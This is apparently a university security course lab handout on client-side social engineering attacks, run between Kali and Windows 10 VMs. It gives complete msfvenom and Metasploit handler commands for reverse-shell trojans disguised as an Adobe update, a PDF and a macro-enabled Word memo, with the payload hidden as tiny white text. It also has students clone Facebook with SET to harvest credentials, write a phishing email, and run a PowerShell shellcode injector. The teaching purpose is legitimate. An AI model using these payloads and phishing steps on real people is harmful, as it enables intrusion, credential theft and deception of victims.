---

title: Lab &ndash; Social Engineering
number: 11
description: "Only amateurs attack machines; professionals target people."
---

Today, social engineering attacks represent a major primary vector for hackers. As Bruce Schneier said, “Only amateurs attack machines; professionals target people.”[1](https://www.schneier.com/crypto-gram-0010.html)  
Further, client-side software represents a much larger attack surface than server-side software. For these reason, many of the major breaches you read about in the news began with a client-side attack. 

In this lab you’ll use two leading tools to perform client-side attacks: msfvenom and the Social Engineering Toolkit (SET). All of these attacks involve creating a malicious payload
that you trick the user into executing. The Metasploit-Framework is used to create the payloads, and you are on your own to trick the user.

# Part 1. MSFVenom with fake AdobeUpdate.exe

In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom can be used to turn Metasploit payloads into stand-alone executables that a user can be tricked into running. Your goal is to (1) create a malicious executable file, (2) host it on a web server, and (3) exploit a Windows 10 VM.

1.	Open your Kali Linux and Windows 10 VMs. Make sure that both are on the same subnet and can ping each other.
2.	On Windows, make sure Windows Defender is turned off. Run:
	* click the windows button on the bottom left of the desktop and searching for 'Defender' and choose 'Windows Defender Security Center'
	* click 'Virus & Threat protection settings'
	* move the 'Real-time protection' slider to the left.

4.	In Kali, type `msfvenom --help-formats` to see a list of output formats that msfvenom supports. We’ll use the `-f exe` option to create a Windows executable.
5.	In Kali, run the following command, all on one line:

        msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your Kali IP] -f exe > /tmp/AdobeUpdate.exe

    Where:

    * `-p`		Selects the payload
    * `-f`		Selects the file type of the output executable
    * `LHOST`   The IP of your Kali Linux VM

6.	Verify that the output file is about 73802 bytes in size. If not, you may need to check that you entered the command correctly and run it again.
10.	Run a msf handler to listen for the meterpreter reverse connection.
    11. On Kali, open a new terminal window and enter `msfconsole`.
    11.	Enter `use exploit/multi/handler`. Once you’ve switched to this exploit module, type `show info`. Note that this module “is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.” A stub adds additional functionality to other exploits.
    12.	Enter `set PAYLOAD windows/meterpreter/reverse_tcp`.
    13.	Enter `set LHOST [IP of Kali VM]`.
    15.	Enter `exploit -j`. 
    
        <div class='alert alert-info' markdown='1'>
        The `-j` option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
        </div>    
        
        <div class='alert alert-info' markdown='1'>
        Because <code>ExitOnSession</code> is set to <code>True</code> (the default for `exploit/multi/handler`; verify with `show advanced` from msfconsole), your handler will die after it gets one connection.
        </div>
    
7.	Now, set up a web server to host your malicious file. 
    8.  Change directories to `/tmp` by entering `cd /tmp` in a kali terminal.
    8.	See that the payload you generated earlier is in this directory: `ls`
    9.  Now, from that directory, run this command:

            python -m SimpleHTTPServer 8888
            
        This will start a web server on your kali instance, serving content from the current directory (`/tmp`).
        
    9.	On your Windows 10 VM, browse to: 

            http://[IP of your Kali VM]:8888/

        Verify that you can view the contents of `/tmp` on your Kali VM.

    
16.	On your Windows 10 VM, in a web browser, download the malicious `AdobeUpdate.exe` file from the Python webserver and run the executable. 
    * If you use Edge/IE browser, download it, click "view downloads", right-click AdobeUpdate.exe, select "Run anyway"
    * If a warning appears saying that Windows couldn’t access Windows SmartScreen, "more info", then click “Run anyway.” 
    * For the warning, “Do you want to allow this app from an unknown publisher…,” click “Yes.”
    
17.	On your Kali VM, you should see in your msfconsole that “Command shell session `X` opened,” where X is the number of the new session. Type:

        sessions -i [the number of the new session]

    This should open a connection to a meterpreter on the Windows VM.
    
17. Run `shell` to drop down into a windows cmd prompt
    18.	Type `whoami` to see the privileges that you are running under. Note that these are the privileges of the user of your Windows 10 VM.
    19.	Run the command `netstat -n` to see a listing of open connections on the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
    20. Return to your meterpreter shell (`exit`, I think).
20. Carry out your nefarious purposes with the victim <i class='fa fa-birthday-cake'></i>


## <span class='label label-success'>Deliverable</span>

Take a screenshot showing the output of running the following commands from your meterpreter session:
    
    pgrep AdobeUpdate.exe
    getpid
    shell
    echo "your first and last name"
    date /t

The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process. 
This establishes that you were successful in this exploit.

The last three commands drop you into a windows shell where you can more easily establish your identity.



<div class='alert alert-info' markdown='1'><strong>Convenience! </strong> The above pattern of (1) generate a payload and (2) set up a handler to listen for a callback
is common enough that SET gives you a higher-level interface for doing the same thing. For instance, the AdobeUpdate.exe steps in the earlier task could have been replaced with the following:

From the SET main menu:

* 1) Spear-Phishing Attack Vectors
* 4) Create a Payload and Listener
* 2) Windows Reverse_TCP Meterpreter
* choose a LHOST and free PORT...
* allow SET to set up a listener for you (`yes`)

Nice, eh?
</div>



# Part 2. Social Engineering Toolkit (SET) -- Site Cloner

In this section, you’ll use the Social Engineering Toolkit (SET) to craft social engineering attacks. 

1.	Navigate to the `/opt/set` directory and run the command `./setoolkit` (don’t forget the `./`). Agree to the terms of service. You should see a screen like the following:
    
    ![](/images/lab_11_2.png){: .img-responsive width='30%'}

2.	Enter option `1` for social-engineering attacks. That should display this menu:
    
    ![](/images/lab_11_3.png){: .img-responsive width='30%'}
    
3.	Select option `2` for website attack vectors. The next menu will list the various web attack vectors:

    ![](/images/lab_11_4.png){: .img-responsive width='30%'}
    
4.	Select number `3` for a credential harvesting attack. This brings you to the following screen:

    ![](/images/lab_11_5.png){: .img-responsive width='30%'}

5.	Select option 2 to clone a target website. This is a very sophisticated feature that can clone almost any website. After you’ve selected this feature, you’ll need to set an IP address to host the cloned site. Set “IP address for the POST back in Harvester/Tabnabbing” to the IP address of Kali Linux for the host-only network.

    Now you get to choose the website to clone. Set the cloned website to `https://www.facebook.com`

    If all has gone well, you should see a screen like the following:

    ![](/images/lab_11_6.png){: .img-responsive width='30%'}
    
6.	Now it’s time to script the phishing message to send. At this point, an attacker would use a tool or service to send a spoofed email. For simplicity, skip this step and instead send an email to your own email account with the message:

    > “You are receiving this email because there is a problem with your account. Please go to www.facebook.com and login to verify your account."

    Use rich text formatting to make `www.facebook.com` a hyperlink that points to `http://[IP of your Kali VM]`.

7. Open the email in your Windows 10 VM. When you receive the email, click the link, which should forward you to this page:

    ![](/images/lab_11_7.png){: .img-responsive width='50%'}
    
    **Note:** the address bar indicates the actual IP of the attacker. This is the biggest indication that the site is forged. If this were a more sophisticated attempt, the attacker would obtain a domain that looked similar to Facebook (like `facebook.webs.com`) For this, one could use a site like [http://freedns.afraid.org](http://freedns.afraid.org).
    
8.	Enter fake credentials into the fields on the spoofed website. After you’ve filled the fields in with whatever words you wish, press the login button on the website. On your Kali VM, you should see something similar to this in your terminal window:

    ![](/images/lab_set_facebook.png){: .img-responsive width='50%'}
        

## <span class='label label-success'>Deliverable</span>

Take a screenshot of `setoolkit` reporting the capture of credentials you enter onto whatever site you spoofed. The screengrab should show:

*   `POSSIBLE USERNAME FIELD FOUND: your.first.and.last.name (or something else clearly identifying you)`
*   `POSSIBLE PASSWORD FIELD FOUND: whatever.password.you.entered`
        
        
        
        
        
# Part 3. Social Engineering Toolkit (SET) -- PowerShell Shellcode Injector

PowerShell is a powerful scripting language built into the Windows operating system. In this section, you will generate an encoded PowerShell script and 
execute it on Windows which opens a Meterpreter session on attacker’s machine. 


1.  Launch `setoolkit` if not already launched. From the main menu, choose `1` for `Social-Engineering Attacks`.
2.  `9` for `PowerShell Attack Vectors`
3.  within this option, you will find four different features. Select `1` for `PowerShell Alphanumeric Shellcode Injector`

    ![](/images/){: .img-responsive width='50%'}

4.	Enter your Kali VM IP address and port `443`. Choose `yes` to start the listener. This will automatically open `msfconsole`, so it will take a minute or two.

5.	While waiting, open another terminal and navigate to `/root/.set/reports/powershell/`

6.	From that directory, open the script using the leafpad command:
        
        apt install leafpad     # if necessary
        leafpad x86_powershell_injection.txt
    
    ![](/images/){: .img-responsive width='50%'}
    
7.	Copy the entire script you found on leafpad to the clipboard. On Windows, open a Paste the script on the windows command line as the figure depicts below. Then press enter.
8.  You should see an opened Meterpreter session. Get the session id with `sessions` if you don't already see it, and then interact with that session with `sessions [id]`
9.  **Optional:** you can save the entire script as a windows batch file (.bat), then trick the user to run that file.

<div class='alert alert-info'><strong>Consider: </strong>What ways might you trick a user into running this script?</div>

## <span class='label label-success'>Deliverable</span>

Take a screenshot showing the output of running the following commands from your meterpreter session:
    
    pgrep powershell
    getpid
    shell
    echo "your first and last name"
    date /t

The first command should show the process id related to your malicious powershell script, and the second verifies that you are tied to that process. 
This establishes that you were successful in this exploit.

The last three commands drop you into a windows shell where you can more easily establish your identity.



# Part 4. Social Engineering Toolkit (SET) -- Malicious PDF

This attack presumes that you still have the handler running listening for a connection from a `windows/meterpreter/reverse_tcp` payload, which was launched 
during the fake adobeupdate.exe section.

Download and install a vulnerable version of Adobe Reader to the Windows 10 vm. v9.0 will do -- you can obtain it from [here](ftp://ftp.adobe.com/pub/adobe/reader/win/9.x/9.0/enu/AdbeRdr90_en_US.exe)

1. Launch `setoolkit` if not already launched. From the main menu:
    * `1) Social-Engineering Attacks`
    * `3) Infectious Media Generator`
    * `1) File-Format Exploits`
    * enter kali ip address
    * `13) Adobe PDF Embedded EXE Social Engineering`
    * `2. Use built-in BLANK PDF for attack` (unless you're feelinga adventurous, in which case you can create your own)
    * `2) Windows Meterpreter Reverse_TCP`
    * Accept default for payload listener LHOST
    * Accept default for port to connect back on
    * Let `set` create a listener right now (`yes`)
    
2.  SET will have put the created payload in `/root/.set/template.pdf`. Your goal now is to get this pdf onto the victim machine. 
    If you still have the python server running in the `/tmp` dir from the fake adobeupdate part of this lab, then you can just move this payload there and download it
    to the victim machine as before. From a different Kali terminal than the `set` one:
    
        mv /root/.set/template.pdf /tmp
        
    You can rename it to whatever you like.
    
3.  On the victim machine, open the downloaded file with Adobe Reader

    * Right-click the downloaded file > `Open with...` > 'Adobe Reader 9.0`
    
4.  Adobe Reader will open a dialog asking you whether you want to save a file that the document is attempting to extract. Do so, <span class='label label-info'>saving the file to a locaiton such as the desktop</span>.
5.  Adobe Reader will then ask if you want to run a script embedded in the pdf document. Let it do so.
6.  You should now have a meterpreter session opened on kali. Interact with it, and continue pwn-age.
        

## <span class='label label-success'>Deliverable</span>

Take a screenshot showing the output of running the following commands from your meterpreter session:
    
    pgrep pdf
    getpid
    shell
    echo "your first and last name"
    date /t

The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process. 
This establishes that you were successful in this exploit.

The last three commands drop you into a windows shell where you can more easily establish your identity.


        
<div class='alert alert-info'><strong>Optional:</strong> Explore! SET has much to offer. Just consider all the ways that you or members of your organization may be
tricked into being compromised...</div>



# Part 5. Create a Malicious Microsoft Word Document

In this section, you will create a macro-enabled Microsoft Word file that opens a Meterpreter session on an attacker’s machine. Note that this is a feature of Word, and not a security vulnerability. For this reason, this attack vector will work as long as you can convince a user to open the Word file.

1.	In Kali, run the following command (all one line):

        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=[kali ip addr] LPORT=7777 -e x86/shikata_ga_nai -f vba-exe > word-macro-exploit

    This will save the exploit to a file called `word-macro-exploit`
2.	`cat word-macro-exploit` and read the beginning of the output. It explains that the output is divided into two sections: A "Macro" section and a "Payload" section. Copy _all_ of the output from your terminal from this command, and paste it into a text file on your Windows VM (or onto a machine with Microsoft Word).

3.	In Kali, run `msfconsole` and run the following commands:

        use exploit/multi/handler
        set payload windows/meterpreter/reverse_tcp
        set LPORT 7777
        set LHOST [IP of your Kali VM]
        set ExitOnSession false
        exploit -j

    The above commands will cause Metasploit to listen on port 8080 for an incoming Meterpreter connection.


4.	Open Word. 

    <div class='alert alert-info'>If you are using the Word 2007 preinstalled on my distributed VM, when it launches, you will be asked for a license activation key. Simply close
    this dialog. You have trial-mode access.</div>
    
    1.  First, enable the Developer tool access if you haven't already. 

        ## Enable Developer tool access in Word 2007
        
        Click the circle office button in the top left > Word Options button towards bottom-right > "Popular" > enable checkbox for "Show Developer tab in the Ribbon"
        
        ## Enable Developer tool access in Word 2010 and higher
        
        From the File tab, select Options. Select “Customize Ribbon” from the left-hand side menu, and check the Developer checkbox (see screenshot below).

        ![](/images/lab_11_8.png){: .img-responsive width='70%'}

    2.  From the Developer ribbon, select “Visual Basic” to open the Visual Basic editor.
    
        ![](/images/lab_11_9.png){: .img-responsive width='70%'}
    
        Inside the visual basic editor, right-click the document, select `Insert > Module`. Open the text file with the exploit code that you copied over from Kali. 
        Paste in all of the code in the "Macro" section (**but not the payload**) into the Visual Basic module you just inserted. 
        
        **Important for getting credit!** About 33 lines into the VBA code, you will see a line with a variable assignment some random gibberish that ends in `.exe`. You will need to know the random
        gibberish later for the deliverable for this question.
        
        
        Save it as a Word macro-enabled document (`.docm`) and close the VB editor.
        
        ![](/images/lab_11_10.png){: .img-responsive width='70%'}
    
5.  In the main body of the Word document, paste the payload hex code from the kali output. Above the hex code, type a simple memo as the ostensible content of the 
    memo. Next, highlight the hex code you pasted in and change the font size to “1” and the font color to white. 
    This will make the hex code difficult to find for anyone who opens the document. Finally, save the document as a macro-enabled Word file 
    (with a “.docm” extension). Name the file something like “Sales Memo.”

    **Optional:** “In order to keep user suspicion low, try embedding the code in one of the many Word macro games that are available on the Internet. That way, the user is happily playing the game while you are working in the background. This gives you some extra time to migrate to another process if you are using Meterpreter as a payload.” From _Metasploit: The Pentester’s Guide_.
    
6.  Test your malicious Word file by opening it on the Windows 10 VM. If Word asks, enable macro content. In the Kali VM, you should now see that a 
    Meterpreter session has been opened to the host workstation. 
    If it doesn’t work, make sure that macros are enabled in your Word doc (Developer tab > Macro Security > Enable all macros).
    
    **Optional:** Use the sendEmail command on Kali to send a spoofed email with the malicious Word file as an attachment. To see how the sendEmail command works, type `man sendEmail.`

## <span class='label label-success'>Deliverable</span>
    
Two screenshots for this one:

1. A screenshot of the line showing the random gibberish `.exe` variable.
    
2.  Take a screenshot showing the output of running the following commands from your meterpreter session:
    
        pgrep [the.random.gibberish.you.noted.earlier.exe]
        getpid
        shell
        echo "your first and last name"
        date /t

    The first command should show the process id related to your trojan word doc, and the second verifies that you are tied to that process. 
    This establishes that you were successful in this exploit.

    The last three commands drop you into a windows shell where you can more easily establish your identity.
    
    
